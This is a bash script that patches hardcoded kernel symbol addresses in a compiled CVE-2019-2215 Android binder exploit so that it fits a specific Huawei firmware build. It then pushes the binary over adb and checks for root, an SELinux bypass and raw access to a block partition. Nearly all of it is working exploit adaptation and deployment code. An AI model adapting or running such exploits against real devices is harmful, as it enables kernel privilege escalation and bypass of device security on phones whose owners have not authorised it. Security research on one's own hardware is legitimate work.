#!/bin/bash
# Binary-patch the two hardcoded kernel addresses in the PRISTINE exploit.
#
# The constants were compiled for a different build of this kernel:
#   FAIR_SCHED_CLASS  0xffffff8008f78408  -> should be 0xffffff8008f48408
#   AVC_CACHE         0xffffff800a2d4c40  -> should be 0xffffff800a276c40
# (taken from the kallsyms of the 8.0.0.110(C635) KERNEL block, recovered with
#  vmlinux-to-elf).
#
# Because the two errors differ (0x30000 and 0x5E000), the KASLR slide comes out
# -0x30000 wrong and the AVC overwrite lands 0x2E000 past the real table - which
# is exactly why the SELinux bypass did nothing.
#
# Patching only these 8-byte literals keeps the code layout, and therefore the
# race timing, identical to the binary that reliably wins.
set -u
cd /home/placeless/dev/p20lite-cve
SRC=libs/arm64-v8a/cve-2019-2215
DST=/tmp/cve_fixed
cp "$SRC" "$DST"

python3 - <<'PY'
import struct, sys
p = "/tmp/cve_fixed"
d = bytearray(open(p, "rb").read())
pairs = [
    (0xffffff8008f78408, 0xffffff8008f48408, "FAIR_SCHED_CLASS"),
    (0xffffff800a2d4c40, 0xffffff800a276c40, "AVC_CACHE"),
]
for old, new, name in pairs:
    ob = struct.pack("<Q", old)
    nb = struct.pack("<Q", new)
    n = d.count(ob)
    print(f"{name}: {n} occurrence(s) of {old:#018x}")
    if n:
        d = bytearray(bytes(d).replace(ob, nb))
open(p, "wb").write(bytes(d))
print("patched size:", len(d))
PY

echo
echo "### verify the new values are present and the old ones gone"
python3 - <<'PY'
import struct
d = open("/tmp/cve_fixed","rb").read()
for old, new, name in [(0xffffff8008f78408,0xffffff8008f48408,"FAIR_SCHED_CLASS"),
                       (0xffffff800a2d4c40,0xffffff800a276c40,"AVC_CACHE")]:
    print(f"{name}: old present={d.count(struct.pack('<Q',old))} new present={d.count(struct.pack('<Q',new))}")
PY

echo
echo "### push and test"
timeout 60 adb push /tmp/cve_fixed /data/local/tmp/cve-fixed 2>&1 | tail -1
timeout 30 adb shell 'chmod 755 /data/local/tmp/cve-fixed'
printf 'id\ncat /proc/self/attr/current\ngetenforce\ndd if=/dev/block/bootdevice/by-name/nvme of=/dev/null bs=512 count=1 2>&1\n' \
  | timeout 150 adb shell /data/local/tmp/cve-fixed > /tmp/fixed.out 2>&1
echo "root:      $(tr -d '\000' < /tmp/fixed.out | grep -ac 'uid=0(root)')"
echo "domain:    $(tr -d '\000' < /tmp/fixed.out | grep -a 'context=' | tail -1 | cut -c1-70)"
echo "avc addr:  $(tr -d '\000' < /tmp/fixed.out | grep -a 'avc_cache' | tail -1)"
echo "access:    $(tr -d '\000' < /tmp/fixed.out | grep -aE 'records|Permission|denied' | tail -1)"
echo
echo "### and look for the HiSuite-downloaded 8.0.0.151 package on the Windows volume"
M=/media/placeless/A498E24798E21816
find "$M" -maxdepth 4 -iname "*hisuite*" -type d 2>/dev/null | head -5
